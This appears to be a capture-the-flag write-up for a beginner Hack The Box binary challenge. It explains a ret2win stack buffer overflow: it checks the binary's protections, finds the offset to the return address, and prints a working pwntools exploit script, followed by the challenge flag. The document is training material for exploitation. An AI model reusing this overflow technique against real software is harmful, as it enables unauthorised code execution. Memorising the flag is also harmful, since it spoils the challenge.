# Questionnaire
> Write-up author: vreshco
## DESCRIPTION:
It's time to learn some things about binaries and basic c. Connect to a remote server and answer some questions to get the flag.
## HINT:
- NONE
## STEPS:
1. Given 2 files, 64 bit binary file and it's source-code.
2. Check the binary's protections.

> VULN -> No Canary Found , No PIE.

![image](https://user-images.githubusercontent.com/70703371/233819788-6503c6ac-da9d-4833-b730-95b22f676043.png)


3. Let's analyze the source-code.

![image](https://user-images.githubusercontent.com/70703371/233819810-96a27b41-dd9c-4491-ac4e-c67171705697.png)


4. It's a simple **ret2win** challenge, where the buffer variable holds 32 as it's buffer but the fgets() specified that the user can enter up to 256 bytes.
5. We can use this to control the RIP to change the return address to the `gg()` to get the flag.
6. Let's find the RIP offset.

![image](https://user-images.githubusercontent.com/70703371/233819942-2b2a5f49-fdf3-486f-a7f3-2ad9e941663b.png)


7. Got the offset at 40, let's grab the `gg()` address and **ret;** gadget to align payload we're sending.

![image](https://user-images.githubusercontent.com/70703371/233819977-1711d888-1139-4a6e-878b-1a63f0b2a939.png)


![image](https://user-images.githubusercontent.com/70703371/233819987-79c09206-c2da-41cc-8a07-6a1d70c00260.png)


> THE SCRIPT

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './test'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

sh = start()

ret = 0x000000000040101a

padding = 40

p = flat([
    asm('nop') * padding,
    ret,
    0x401176
])

sh.sendline(p)

sh.interactive()
```

> LOCALLY

![image](https://user-images.githubusercontent.com/70703371/233820011-ce4369bf-8007-43a1-a5e7-c034b79618b1.png)


8. Great! We jumped there, let's run it remotely.

![image](https://user-images.githubusercontent.com/70703371/233820095-f065f9be-a8ba-41e5-a77c-27c84bf60f5d.png)


9. It's a question, so we don't get the flag by sending our payload (?)
10. Let's answer all of it.

![image](https://user-images.githubusercontent.com/70703371/233820132-3d107f14-bb02-41af-9518-20e966030416.png)


![image](https://user-images.githubusercontent.com/70703371/233820136-673156e0-c717-448f-8ebb-1f122438c59b.png)


![image](https://user-images.githubusercontent.com/70703371/233820143-902fe3a2-fd67-4215-a471-a6f064367d91.png)


![image](https://user-images.githubusercontent.com/70703371/233820150-cd60efa2-5967-41e4-ba1b-e871ef44ab42.png)


![image](https://user-images.githubusercontent.com/70703371/233820160-aeb5b82a-ea4c-441f-9222-a5f4eb23fffc.png)


![image](https://user-images.githubusercontent.com/70703371/233820168-9dd0c761-dcf7-40f1-91a8-dd1c2ad6ed30.png)


![image](https://user-images.githubusercontent.com/70703371/233820175-1414f007-25a0-4442-ba30-53cad472467a.png)


![image](https://user-images.githubusercontent.com/70703371/233820187-a4ac97c6-6b4c-4860-a4c2-137f71fb01de.png)


![image](https://user-images.githubusercontent.com/70703371/233820192-03f3a0d0-06de-4303-b972-401c60c18fe0.png)


![image](https://user-images.githubusercontent.com/70703371/233820200-26db9b4b-f756-4b31-8a7d-9f86bf50dae3.png)


11. Got the flag!

## FLAG

```
HTB{l34rn_th3_b451c5_b3f0r4_u_5t4rt}
```


